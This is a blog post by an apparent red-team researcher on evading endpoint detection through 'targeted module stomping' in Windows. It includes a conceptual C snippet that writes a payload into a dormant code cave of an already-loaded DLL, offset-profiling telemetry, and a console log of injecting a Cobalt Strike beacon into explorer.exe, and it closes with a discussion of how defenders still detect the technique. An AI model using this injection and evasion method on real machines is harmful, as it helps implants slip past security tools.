# https://medium.com/@toneillcodes/dont-be-so-primitive-evolving-the-module-stomping-staging-chain-59fb96db50ac

[Sitemap](https://medium.com/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40toneillcodes%2Fdont-be-so-primitive-evolving-the-module-stomping-staging-chain-59fb96db50ac&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=---top_nav_layout_nav-----------------------------------------)

Get app

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40toneillcodes%2Fdont-be-so-primitive-evolving-the-module-stomping-staging-chain-59fb96db50ac&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![Unknown user](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

[![Tom O'Neill](https://miro.medium.com/v2/resize:fill:40:40/1*csbZCQnf74EEf36Ulms2sw.png)](https://medium.com/@toneillcodes?source=post_page---post_author_sidebar--59fb96db50ac-----------------b60872cadd4b----------------------)

## Tom O'Neill

Independent Security Researcher

Follow writer

Cybersecurity

Red Team

Malware

Windows Internals

Windows

# Don’t Be So Primitive: Evolving the Module Stomping Staging Chain

## Using Undocumented Kernel Transitions to Achieve Single-Primitive Module Stomping

[![Tom O'Neill](https://miro.medium.com/v2/resize:fill:32:32/1*csbZCQnf74EEf36Ulms2sw.png)](https://medium.com/@toneillcodes?source=post_page---byline--59fb96db50ac---------------------------------------)

[Tom O'Neill](https://medium.com/@toneillcodes?source=post_page---byline--59fb96db50ac---------------------------------------)

Follow

6 min read

·

Jun 26, 2026

2

[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3D59fb96db50ac&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40toneillcodes%2Fdont-be-so-primitive-evolving-the-module-stomping-staging-chain-59fb96db50ac&source=---header_actions--59fb96db50ac---------------------post_audio_button------------------)

Share

In offensive Windows tradecraft, the multi-step staging chain is treated as the standard playbook. We reflexively anchor our loaders to a predictable cadence: find a target, explicitly toggle memory permissions from `RX` to `RWX` via `VirtualProtect`, write the payload, and flip it back. We do this to manage anomalies, but the resulting user-mode API sequence creates a loud, highly targeted behavioral signature.

When we shift to **Targeted Module Stomping**, that entire sequence is obsolete.

By using data-driven profiling to pinpoint stable, dormant code caves that are already naturally loaded by an enterprise application, the allocation step disappears. And because `WriteProcessMemory` handles the subsequent permission flip implicitly at the kernel layer, `VirtualProtect` completely vanishes from your code. **Your entire staging footprint collapses into a solitary user-mode primitive.**

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*ziYC1n9FUkJvlDqLAnc9cA.png)

### Tools

The module hunting code referenced in this post can be found in my ‘dll-research’ repository.

[**GitHub - toneillcodes/dll-research: Windows Dynamic-Link Library Research** \\
\\
**Windows Dynamic-Link Library Research. Contribute to toneillcodes/dll-research development by creating an account on…**\\
\\
github.com](https://github.com/toneillcodes/dll-research?source=post_page-----59fb96db50ac---------------------------------------)

The module stomping code referenced in this post can be found in the ‘module-injection’ folder in my ‘windows-process-injection’ repository.

[**GitHub - toneillcodes/windows-process-injection: A collection of techniques for process injection…** \\
\\
**A collection of techniques for process injection on Windows - toneillcodes/windows-process-injection**\\
\\
github.com](https://github.com/toneillcodes/windows-process-injection?source=post_page-----59fb96db50ac---------------------------------------)

## The Evolution of the Chain

### Moving Away from Sacrificial DLLs

In a basic module stomp, the chain typically begins by forcing the process to map a new, signed DLL into its address space using `LoadLibrary`.

While this successfully avoids creating raw private memory allocations, loading an unexpected or rare module into an enterprise application creates a distinct, high-fidelity telemetry spike.

A more elegant approach involves profiling target applications (such as browsers, communication clients, or thick clients) to identify native imports that can be safely overwritten.

By identifying large, file-backed `.text` sections and locating stable, dormant code caves that are not called during normal execution, we can identify perfect **stompable targets** that are **_already naturally loaded_** by the host process. This eliminates the need to introduce a sacrificial module entirely.

### The Single-Primitive Staging Chain

Once a naturally occurring target is identified, we can leverage the implicit kernel behaviors of `WriteProcessMemory` (WPM) to strip the remaining user-mode sequence.

Because WPM passes execution down to `NtWriteVirtualMemory`, which transparently toggles the underlying page protections at the kernel layer before reverting them, the explicit `VirtualProtect` loop becomes unnecessary.

## Collapsing the Chain

### Traditional Stomp vs. Targeted Stomp

The staging sequence required collapses dramatically when performing a targeted stomp on code that has already been loaded.

1. **Target Preparation**

    • **Traditional**: LoadLibrary (Brings in a noisy sacrificial DLL)

    • **Targeted**: None (Stompable target pre-identified via profiling)
2. **Permission Change**

    • **Traditional**: VirtualProtectEx (Flips `RX` to `RW`/`RWX`)

    • **Targeted**: None (Skipped entirely)
3. **Memory Write**

    • **Traditional**: WriteProcessMemory (Writes payload)

    • **Targeted**: WriteProcessMemory (Writes payload + handles implicit flip)
4. **Permission Reset**

    • **Traditional**: VirtualProtectEx (Flips back to `RX`)

    • **Targeted**: None (Skipped entirely)
5. **Execution**

    • **Both**: Thread Hijack / Callback Manipulation

Mechanically, the user-mode code transitions instantly from referencing a naturally loaded module handle straight to a single write primitive:

```
// A conceptual look at the collapsed staging primitive
// Using pre-identified stompable targets naturally residing in the process space

// 1. Locate an existing, naturally loaded module
// NOTE: While shown as GetModuleHandle here, this can be resolved completely
// API-less by walking the PEB's InLoadOrderModuleList.
HMODULE hExistingModule = GetModuleHandleA("native_enterprise_library.dll");
if (!hExistingModule) {
    return -1;
}

// 2. Point straight to the pre-profiled, dormant code cave within the RX text section
LPVOID naturalTargetCave = (LPVOID)((DWORD_PTR)hExistingModule + PRE_PROFILED_CAVE_OFFSET);

// 3. The section is currently PAGE_EXECUTE_READ.
// No LoadLibrary, no VirtualProtect. We issue a single user-mode write primitive.
BOOL stompSuccess = WriteProcessMemory(
    GetCurrentProcess(),
    naturalTargetCave,
    payloadBuffer,
    payloadSize,
    NULL
);

if (stompSuccess) {
    // Transition straight to execution (e.g., thread hijacking or callback manipulation)
}
```

## Proof-of-Concept

### Injecting a Beacon Into Explorer.exe

After profiling the target process ‘explorer.exe’, we select the`msi.dll` as our target. API monitoring didn’t record any hits to the EAT entries, and incremental stomping with a sliding window identified 7 possible entry points across 539 tested offsets.

## Get Tom O'Neill’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Subscribe

Remember me for faster sign in

Example data from the collected telemetry:

- Test 181: `TERMINATED_SHELL_RESTART_REQ` with status code `0x5bb`
- Test 182: `STABLE_TIMEOUT_REACHED` using offset `0xdd810`
- Test 183: `TERMINATED_SHELL_RESTART_REQ` with status code `0x5bb`

```
{... "iteration": 181, "target_binary": "explorer.exe", "evaluated_module": "msi.dll", "target_function": null, "target_offset": "0xdc810", "status": "TERMINATED_SHELL_RESTART_REQ", "kernel_exit_code": "0x5bb", "execution_duration_sec": 13.1}
{... "iteration": 182, "target_binary": "explorer.exe", "evaluated_module": "msi.dll", "target_function": null, "target_offset": "0xdd810", "status": "STABLE_TIMEOUT_REACHED", "kernel_exit_code": "STABLE", "execution_duration_sec": 60.28}
{... "iteration": 183, "target_binary": "explorer.exe", "evaluated_module": "msi.dll", "target_function": null, "target_offset": "0xde810", "status": "TERMINATED_SHELL_RESTART_REQ", "kernel_exit_code": "0x5bb", "execution_duration_sec": 12.16}
```

- Using the `remote-stomp` utility, we can now execute the single-primitive write targeting the ‘stable’ `0xdd810``.text` section offset within `msi.dll` to host a stageless Cobalt Strike HTTPS Beacon:

```
c:\dev\windows-process-injection\module-stomping>remote-stomp.exe -p 16136 -d msi.dll -o 0xdd810
[*] Running PI with target PID: 16136
[*] Successfully opened handle to PID: 16136
[*] Target PEB located at: : 0x0000000000e07000
[*] Attempting to locate the module base for msi.dll.
[*] Target DLL base located at: : 0x00007ffd84f60000
[*] Applying RVA offset 0xDD810 directly from Image Base
[*] Target address resolved to: 0x00007ffd8503d810
[*] Writing to buffer.
[*] Creating a new thread.
[*] Process injection operation complete.

c:\dev\windows-process-injection\module-stomping>
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*8E0OCw3H56Ji6AB9bQ7aJQ.png)

Cobalt Strike HTTPS Beacon

## Sequence Evasion vs. Stealth

Whenever discussing API reduction, it is vital to separate **user-mode sequence evasion** from **kernel-level telemetry blindness**.

Collapsing a module stomp workflow this way is highly effective against naive user-mode hooking chains and weak static heuristics.

Many legacy behavioral engines look for a sequence of user-mode API calls. For example, a call to `VirtualProtect` immediately preceding a write operation to a DLL's text section.

Eliminating `LoadLibrary` ensures there is no unusual module-load event, and skipping `VirtualProtect` breaks expected behavioral signatures entirely.

However, this is not a magic bullet against mature EDR platforms and rigorous DFIR analysis:

- **The Internal Permission Flip:** Do not confuse bypassing the _user-mode_`VirtualProtect` API with bypassing the _action_ of changing memory protections. The kernel still has to toggle the page permissions to writable before copying the data, and it reverts them immediately after. Modern memory-monitoring tools and ETW (Event Tracing for Windows) providers track these raw, underlying memory protection changes (`MiProtectVirtualMemory`). The fact that the kernel performed it transparently on behalf of WPM doesn’t hide the state-modification event from an engine that looks for text-section modifications.
- **Kernel-Level Callbacks:** Because WPM relies on `NtWriteVirtualMemory`, the kernel must still service the syscall. Drivers that use robust memory-probing or object callbacks can register underlying page modifications and cross-reference the calling thread, even if your user-mode code avoids the traditional API sequence.
- **Post-Exploitation Memory Scans:** Stomping a naturally loaded, file-backed DLL eliminates obvious private, unbacked `RX` memory artifacts and avoids anomalous module loading events. However, the content of the stomped section has still been altered. Periodic or event-driven memory scanners looking for modified export tables, code integrity anomalies (comparing memory to disk), or known shellcode signatures will still flag the payload during a routine sweep.

## Conclusion

Moving away from artificial sacrificial modules and instead profiling applications for native, stompable targets allows us to combine precision engineering with `WriteProcessMemory`'s implicit page management.

Understanding the delta between documented Win32 behavior and actual kernel execution allows us to strip unnecessary noise out of our tradecraft.

Ultimately, techniques like this highlight the defensive reality: defenders cannot rely on static analysis or fragile user-mode API-chain monitoring and must use deep, structural memory-integrity verification and kernel-level choke points.

## References

**Windows Process Injection Repository** [https://github.com/toneillcodes/windows-process-injection](https://www.google.com/search?q=https%3A%2F%2Fgithub.com%2Ftoneillcodes%2Fwindows-process-injection)

**DLL Research Repository** [https://github.com/toneillcodes/dll-research](https://github.com/toneillcodes/dll-research)

**The Single-Primitive Write: WriteProcessMemory’s Hidden Page Flip**

[https://medium.com/@toneillcodes/the-single-primitive-write-writeprocessmemorys-hidden-page-flip-e5cb952bbfb2](https://medium.com/@toneillcodes/the-single-primitive-write-writeprocessmemorys-hidden-page-flip-e5cb952bbfb2)

**Hunting for Module Stomping Targets**

[https://medium.com/@toneillcodes/hunting-for-module-stomping-targets-1e9b8bb09766](https://medium.com/@toneillcodes/hunting-for-module-stomping-targets-1e9b8bb09766)

**Advanced Evasion Tradecraft: Precision Module Stomping**

[https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)

**How is it that WriteProcessMemory succeeds in writing to read-only memory?** — Raymond Chen (The Old New Thing)

[https://devblogs.microsoft.com/oldnewthing/20181206-00/?p=100415](https://www.google.com/search?q=https%3A%2F%2Fdevblogs.microsoft.com%2Foldnewthing%2F20181206-00%2F%3Fp%3D100415)

Cybersecurity

Red Team

Malware

Windows Internals

Windows

[![Tom O'Neill](https://miro.medium.com/v2/resize:fill:48:48/1*csbZCQnf74EEf36Ulms2sw.png)](https://medium.com/@toneillcodes?source=post_page---post_author_info--59fb96db50ac---------------------------------------)

[![Tom O'Neill](https://miro.medium.com/v2/resize:fill:64:64/1*csbZCQnf74EEf36Ulms2sw.png)](https://medium.com/@toneillcodes?source=post_page---post_author_info--59fb96db50ac---------------------------------------)

Follow

[**Written by Tom O'Neill**](https://medium.com/@toneillcodes?source=post_page---post_author_info--59fb96db50ac---------------------------------------)

[57 followers](https://medium.com/@toneillcodes/followers?source=post_page---post_author_info--59fb96db50ac---------------------------------------)

· [30 following](https://medium.com/@toneillcodes/following?source=post_page---post_author_info--59fb96db50ac---------------------------------------)

Independent Security Researcher

Follow

[Help](https://help.medium.com/hc/en-us?source=post_page-----59fb96db50ac---------------------------------------)

[Status](https://status.medium.com/?source=post_page-----59fb96db50ac---------------------------------------)

[About](https://medium.com/about?autoplay=1&source=post_page-----59fb96db50ac---------------------------------------)

[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----59fb96db50ac---------------------------------------)

[Press](mailto:pressinquiries@medium.com)

[Blog](https://blog.medium.com/?source=post_page-----59fb96db50ac---------------------------------------)

[Store](https://medium.com/store)

[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----59fb96db50ac---------------------------------------)

[Rules](https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----59fb96db50ac---------------------------------------)

[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----59fb96db50ac---------------------------------------)

[Text to speech](https://speechify.com/medium?source=post_page-----59fb96db50ac---------------------------------------)